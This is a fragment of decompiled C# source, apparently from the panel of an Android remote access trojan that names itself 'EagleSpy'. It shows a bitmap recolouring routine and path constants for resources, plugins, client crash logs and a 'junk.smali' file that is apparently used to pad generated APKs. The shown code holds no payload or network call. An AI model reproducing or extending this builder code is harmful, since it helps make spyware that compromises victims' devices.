		// Token: 0x0600083E RID: 2110 RVA: 0x000CDAB0 File Offset: 0x000CBCB0
		public static Bitmap RECOLOR(Image image, Color baseColor, Color newColor)
		{
			float[][] array = new float[5][];
			int num = 0;
			float[] array2 = new float[5];
			array2[0] = 1f;
			array[num] = array2;
			int num2 = 1;
			float[] array3 = new float[5];
			array3[1] = 1f;
			array[num2] = array3;
			int num3 = 2;
			float[] array4 = new float[5];
			array4[2] = 1f;
			array[num3] = array4;
			int num4 = 3;
			float[] array5 = new float[5];
			array5[3] = 1f;
			array[num4] = array5;
			array[4] = checked(new float[]
			{
				(float)(newColor.R - baseColor.R) / 255f,
				(float)(newColor.G - baseColor.G) / 255f,
				(float)(newColor.B - baseColor.B) / 255f,
				0f,
				1f
			});
			ColorMatrix colorMatrix = new ColorMatrix(array);
			ImageAttributes imageAttributes = new ImageAttributes();
			imageAttributes.SetColorMatrix(colorMatrix);
			Bitmap bitmap = new Bitmap(image.Width, image.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.DrawImage(image, new Rectangle(0, 0, image.Width, image.Height), 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, imageAttributes);
			}
			return bitmap;
		}

		// Token: 0x04000997 RID: 2455
		public static Font FontDrawString = null;

		// Token: 0x04000998 RID: 2456
		public static Font f = null;

		// Token: 0x04000999 RID: 2457
		public static readonly string MY_Path = Application.StartupPath + "\\";

		// Token: 0x0400099A RID: 2458
		public static readonly string res_Path = Application.StartupPath + "\\res";

		// Token: 0x0400099B RID: 2459
		public static readonly string res_Path_iconsapps = Application.StartupPath + "\\res\\Icons\\Apps";

		// Token: 0x0400099C RID: 2460
		public static readonly string Storepath = Application.StartupPath + "\\res\\Store";

		// Token: 0x0400099D RID: 2461
		public static readonly string Junkpath = Application.StartupPath + "\\res\\Lib\\junk.smali";

		// Token: 0x0400099E RID: 2462
		public static readonly string CrashsPath = Application.StartupPath + "\\res\\ClientCrashs";

		// Token: 0x0400099F RID: 2463
		public static readonly string domen = "plugens.angel.plugens";

		// Token: 0x040009A0 RID: 2464
		public static readonly string users = "Users";

		// Token: 0x040009A1 RID: 2465
		public static readonly string nameRAT = "EagleSpy";

		// Token: 0x040009A2 RID: 2466
		public static StringBuilder maps;

		// Token: 0x040009A3 RID: 2467
		public static List<object> plug;

		// Token: 0x040009A4 RID: 2468
		public static string SupportedText;

		// Token: 0x040009A5 RID: 2469
		public static string SupportedImages;

		// Token: 0x040009A6 RID: 2470
		public static string SupportedVideo;

		// Token: 0x040009A7 RID: 2471
		public const int IconsSize = 48;
	}
}
